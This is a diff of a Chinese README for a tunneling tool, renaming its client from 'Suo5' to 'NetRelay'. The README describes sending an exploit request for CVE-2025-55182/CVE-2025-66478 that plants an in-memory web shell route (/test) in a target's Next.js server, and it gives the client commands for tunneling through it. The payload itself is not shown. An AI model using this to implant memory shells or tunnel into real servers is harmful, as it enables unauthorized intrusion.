@@ -14,10 +14,10 @@
 node suo5.js
 ```
 
-默认监听 `8080` 端口，Suo5 客户端连接地址为：
+默认监听 `8080` 端口，NetRelay 客户端连接地址为：
 
 ```bash
-./suo5 -t http://target:8080/
+./netrelay -t http://target:8080/
 ```
 
 ## Next.js 内存马
@@ -25,8 +25,8 @@ node suo5.js
 `next_payload.http` 是针对 CVE-2025-55182/CVE-2025-66478 生成的请求。根据目标修改请求中的
 `Host` 和请求路径后发送，执行成功后会在目标现有的 Node.js HTTP Server 中挂载 `/test` 路由。
 
-Suo5 客户端连接地址为：
+NetRelay 客户端连接地址为：
 
 ```bash
-./suo5 -t http://target:3000/test
+./netrelay -t http://target:3000/test
 ```
